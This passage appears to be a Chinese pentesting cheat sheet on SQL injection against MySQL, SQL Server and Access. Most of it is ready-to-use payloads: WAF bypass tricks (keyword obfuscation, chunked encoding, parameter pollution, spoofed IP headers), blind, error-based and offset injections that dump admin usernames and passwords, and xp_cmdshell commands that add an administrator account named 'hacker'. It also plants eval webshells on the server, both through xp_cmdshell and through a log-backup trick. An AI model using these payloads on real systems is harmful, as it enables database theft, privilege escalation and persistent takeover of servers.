最常见的一个盲注的sql语句：</p><p>select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</p><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。 那么上面的这条sql语句可以使用greatest变为如下的子句:</p><p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p><h3 id="Between注入-1"><a href="#Between注入-1" class="headerlink" title="Between注入"></a>Between注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如username的字符内容是test1，第一个字符是t，a到b搜索不了，页面不正常。 a到t就有了，页面正常</p><p><img src="https://image.3001.net/images/20220714/1657765644_62cf7f0c4a9bf9f4e426d.png!small" alt="image"><br>使用between and：</p><p>使用between and:</p><p>between a and b：</p><p>between 1 and 1; 等价于 &#x3D;1</p><h3 id="or-and-xor-not绕过："><a href="#or-and-xor-not绕过：" class="headerlink" title="or and xor not绕过："></a>or and xor not绕过：</h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p><h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>（#，–(后面跟一个空格））过滤：</p><p>id&#x3D;1’ union select 1,2,3||’1</p><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><p>id&#x3D;1’ union select 1,2,’3</p><h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h3 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h3><p>（1）使用注释符绕过：</p><p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p><p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p><p>（2）使用大小写绕过：</p><p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p><p>（3）内联注释绕过：</p><p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE *&#x2F;&#x2F;*!TaBlE_ScHeMa</em>&#x2F; like database()#</p><p>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</p><p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p><h2 id="Sql注入Bypass"><a href="#Sql注入Bypass" class="headerlink" title="Sql注入Bypass"></a>Sql注入Bypass</h2><h3 id="WAF绕过-应用层"><a href="#WAF绕过-应用层" class="headerlink" title="WAF绕过-应用层"></a>WAF绕过-应用层</h3><p>Sql绕过姿势：<a href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p><h4 id="大小写-关键字替换"><a href="#大小写-关键字替换" class="headerlink" title="大小写&#x2F;关键字替换"></a>大小写&#x2F;关键字替换</h4><ul><li>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</li><li>Hex() bin() 等价于 ascii()</li><li>Sleep() 等价于 benchmark()</li><li>Mid() substring() 等价于substr()</li><li>@@user 等价于 User()</li><li>@@Version 等价于 version()</li></ul><p>绕过：</p><p>AND -&gt; &amp;&amp;</p><p>OR -&gt; || &#x2F; ^</p><p>&#x3D; -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;，!&lt;&gt;</p><p>&gt; X -&gt; not between 0 and X</p><p>WHERE -&gt; HAVING</p><p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p><h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A等</p><h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F;等</p><h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p><h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在burp抓包时，存在Post请求的注入，如id&#x3D;1’ and 1&#x3D;2#</p><p>尝试分块传输</p><p><img src="https://image.3001.net/images/20220714/1657765719_62cf7f578b907ecc13fdc.png!small" alt="image"><br>进行分块传输的时候，请求头要加上<strong>Transfer-Encoding: Chunked</strong>，然后POST的数据规则如下</p><p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的id连起来 0 #表明分块请求结束，一个0和两个换行</p><h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p><h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p><h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul><li>s-&gt;%73-&gt;%25%37%33</li><li>hex,unlcode,base64等</li></ul><h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改Get请求为Post请求</p><ul><li>GET POST COOKIE等</li><li>POST-&gt;multipart&#x2F;form-data</li></ul><h4 id="中间件HPP-HTTP参数污染"><a href="#中间件HPP-HTTP参数污染" class="headerlink" title="中间件HPP(HTTP参数污染)"></a>中间件HPP(HTTP参数污染)</h4><p><img src="https://image.3001.net/images/20220714/1657765734_62cf7f6657d4c137788e0.png!small" alt="image"></p><p><strong>HPP</strong>是HTTP Parameter Pollution的缩写，意为HTTP参数污染。</p><ul><li>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET&#x2F;POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=aa%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=bb%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%E9%83%BD%E5%8F%96%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFname=aa,bb">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb</a> 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</li><li>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择</li><li>通过HPP接管账户,当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。</li><li>HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</li></ul><p><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1,2,3 from table where id&#x3D;1<br><a href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1&amp;page&#x3D;2,3 from table where id&#x3D;1</p><p>HTTP参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果,以参数color&#x3D;red&amp;color&#x3D;blue为例</p><h3 id="WAF绕过-数据库特性"><a href="#WAF绕过-数据库特性" class="headerlink" title="WAF绕过-数据库特性"></a>WAF绕过-数据库特性</h3><p>mysql注释符有三种</p><ul><li>#,&#x2F;…&#x2F;,–…(注意–后面有一个空格，或者为–+)</li></ul><p>空格符</p><ul><li>0x09,0x0a-0x0d,0x20,0xa0</li></ul><p>特殊符号：%a换行符</p><ul><li>可结合注释符使用%23%0a,%2d%2d%0a</li></ul><p>内联注释</p><ul><li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(),数字范围1000-50540</li></ul><p>mysql黑魔法</p><ul><li>select{xusername}from{x11test.admin};</li></ul><h3 id="WAF绕过-逻辑层"><a href="#WAF绕过-逻辑层" class="headerlink" title="WAF绕过-逻辑层"></a>WAF绕过-逻辑层</h3><p>逻辑问题</p><ol><li>云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。</li><li>当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。</li><li>HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。</li><li>特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</li></ol><p>性能问题</p><ul><li>猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</li><li>猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</li></ul><p>例子1：</p><p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p><ul><li>0xA*1000指0xA后面A重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。</li></ul><p>例子2：</p><p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p><ul><li>获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。</li></ul><p>白名单</p><ul><li>方式一：IP白名单</li><li>从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。测试方法：修改http的header来bypasswaf</li></ul><p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p><p>方式二：静态资源</p><ul><li>特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</li><li>Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php后面基本不识别</li></ul><p><a href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p><p>方式三：url白名单</p><ul><li>为了防止误拦，部分waf内置默认的白名单列表，如admin&#x2F;manager&#x2F;system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势</li></ul><h2 id="Sqlserver注入（mssql）"><a href="#Sqlserver注入（mssql）" class="headerlink" title="Sqlserver注入（mssql）"></a>Sqlserver注入（mssql）</h2><p><strong>SQL Server</strong>数据库是由Microsoft开发和推广的关系数据库管理系统(DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p><p><strong>SQLServer有三个权限级别：</strong></p><ul><li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li><li>db权限：文件管理，数据库操作等权限 users-administrators</li><li>public权限：数据库操作 guest-users</li></ul><p><img src="https://image.3001.net/images/20220714/1657765752_62cf7f787d9033b77f774.png!small" alt="image"></p><p>判断是否是SA权限(数据库操作、文件管理、命令执行、注册表读取)</p><ol><li>select is_srvrolemember(‘sysadmin’)</li></ol><p>判断是否是db_owner权限 (数据库操作、文件管理)</p><ol><li>select is_member(‘db_owner’)</li></ol><p>判断是否是public权限 (数据库操作)</p><ol><li>select is_srvrolemember(‘public’)</li></ol><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p><p>附上payload：</p><p>select @@version; #查询数据库的版本</p><p>select @@servername; #查询服务名</p><p>select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</p><p>select db_name(); #查询当前数据库名</p><p>select db_name(1); #查询第一个数据库名</p><p>select db_name(2); #查询第二个数据库名</p><p>select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner</p><p>use tempdb #切换到tempdb表</p><p>top n #查询前n条记录</p><p>limit 2,3 #查询第2条开始的3条数据，也就是2,3,4</p><p>select substring(‘string’,2,1) #截取给定字符串的索引为2的1个字符</p><p>select ascii(‘a’) #查询给定字符串的ascii值</p><p>select len(‘string’) #查询给定字符串的长度</p><p>EXEC sp_spaceused @updateusage &#x3D; N’TRUE’; #查询当前数据库的大小</p><p>sp_spaceused ‘表名’ #查询指定表名的大小</p><p>EXEC master.sys.xp_dirtree ‘\192.168.106.5\xx.txt’,0,1;</p><p>判断是否是SA权限</p><p>select is_srvrolemember(‘sysadmin’)</p><p>判断是否是db_owner权限</p><p>select is_member(‘db_owner’)</p><p>判断是否是public权限</p><p>select is_srvrolemember(‘public’)</p><h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a>普通注入</h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点</p><p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。</p><p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p><p>找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据</p><p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4提示: xtype&#x3D;’U’ 为 用户表</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4替换 col_name(object_id(‘manage’),1) 中的1 依次为 2，3，4查出所有列名。</p><p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p><p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p><h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p><p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>案例： mozhe_dbv2是数据库名字</p><p><img src="https://image.3001.net/images/20220714/1657765776_62cf7f9087fb6626ca007.png!small" alt="image"></p><p>一次爆指定表的所有列（只限于mssql2005及以上版本）：</p><p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p><p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><p>案例： mange是表名<br><img src="https://image.3001.net/images/20220714/1657765789_62cf7f9d50b3e1805fb70.png!small" alt="image"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong>版本</p><p>And 1&#x3D;(select db_name()) &#x2F;&#x2F;当前数据库名</p><p>and 1&#x3D;(select @@servername) &#x2F;&#x2F;本地服务名</p><p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F;判断是否是系统管理员sa</p><p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p><p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F;判断是否是库权限dbo</p><p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F;判断是否有库读取权限</p><h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2)单个爆破："></a>(2)单个爆破：</h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名</p><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p><p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’ ))— 获取第一个列名</p><p>and 1&#x3D;convert(int,(select top 1 username from login ))</p><p>and 1&#x3D;convert(int,(select top 1 password from login ))</p><h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2)全爆语句"></a>(2)全爆语句</h3><p>爆表，要求sqlserver版本2005以上</p><p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p><p>爆列</p><p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p><h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p><p>如果是sa权限，就延时。</p><p>案例：</p><p><img src="https://image.3001.net/images/20220714/1657766248_62cf8168dbaad26776ceb.png!small" alt="img"></p><p>判断内容</p><p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p><h3 id="XP-CMDSHELL检测"><a href="#XP-CMDSHELL检测" class="headerlink" title="XP_CMDSHELL检测"></a>XP_CMDSHELL检测</h3><p>看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p><p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p><p>开启xpcmdshell一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p><p>前提：sa权限探测是否存在1433端口。然后检测是否开启CMDSHELL</p><p>用XP_CMDSHELL添加用户hacker：</p><p>exec master..xp_cmdshell “whoami”</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p><p>XP_CMDSHELL把用户hacker加到ADMIN组：</p><p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p><h2 id="拿shell方法"><a href="#拿shell方法" class="headerlink" title="拿shell方法"></a>拿shell方法</h2><p>前提：</p><p>1具备sa或者dbo权限</p><p>2web目录的绝对路径 （可以利用xp_cmdshell的方式寻找绝对路径，插个眼）</p><h3 id="1-xp-cmdshell拿shell"><a href="#1-xp-cmdshell拿shell" class="headerlink" title="(1)xp_cmdshell拿shell"></a>(1)xp_cmdshell拿shell</h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p><h3 id="2-差异备份拿shell"><a href="#2-差异备份拿shell" class="headerlink" title="(2)差异备份拿shell"></a>(2)差异备份拿shell</h3><p>大概思路：</p><p>假设：<a href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p><p>中的code参数存在注入点 并且获得数据库名字为abc 爆出了物理路径为e:\xampp\htdocs\dvwa\</p><p>(1) 修改数据库设置为恢复模式</p><p><a href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p><p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p><p>(2) 备份当前数据库日志到文件</p><p><a href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p><p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p><p>(3) 建立一张表和一个字段</p><p><a href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p><p>(4) 往表中插入一句话马子</p><p><a href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p><p>values中的内容一般转换为马子的hex值。</p><p>(5) 再次备份日志</p><p><a href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p><p>再次备份日志，备份路径为网站服务器的物理路径</p><p>(6) 删除表</p><p><a href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p><p>然后菜刀尝试连接<a href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p><h2 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h2><p>Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p><p>sqlmap语句：python sqlmap.py -u “<a href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p><h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a>普通注入</h3><p>判断注入点</p><p>在参数后面加 单引号</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a>‘ #页面报错</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p><p>猜字段： 1 order by 4 报错 1 order by 3 正确</p><h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a>有回显：</h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）</p><p>查列：and exists (select 列名 from 表名) （假设存在user、password）</p><p>?id&#x3D;3 and exists (select * from test)</p><p>?id&#x3D;3 and exists (select * from admin)</p><p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p><p>?id&#x3D;3 and exists (select username from admin) 说明存在username</p><p>?id&#x3D;3 and exists (select password from admin) 说明存在password</p><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p><p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p><h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a>无回显：</h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p><p>查列：and exists (select 列名 from 表名)</p><p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p><p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段(username)中第一条记录内容的第二个字符</p><p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段(username)中第二条记录内容的第一个字符</p><h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a>偏移注入（回显数连续）</h3><p>假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续</p><p><img src="https://image.3001.net/images/20220714/1657765814_62cf7fb6ed96ca3d6341d.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin –返回到一个错误页面提示查询语句出错，因此admin表的列数为6</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p><p>因为回显如下图 28 29 30是连着的，直接在27后加表名.*</p><p><img src="https://image.3001.net/images/20220714/1657765836_62cf7fcc12b6e7da878c0.png!small" alt="image"></p><p>爆出内容<br><img src="https://image.3001.net/images/20220714/1657765847_62cf7fd738ed7ab7c3339.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加where id &#x3D;数值，可得到更多的内容</p><h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a>偏移注入（常规操作）</h3><p>Access偏移注入：表名知道，列名无法获取的情况下。</p><p>存在注入点，且order by下判断出字段数为22行</p><p><strong>爆出显位</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p><p>*****<strong>号判断直到页面错误有变化</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p><p>说明admin有6个字段</p><p>*<em>Access*</em>*<em>偏移注入</em>*，基本公式为：</p><p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p><p>也就是：</p><p>* &#x3D; 6个字符</p><p>2 × * &#x3D; 12个字符</p><p>22 - 12 &#x3D; 10个字符</p><p>一级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; 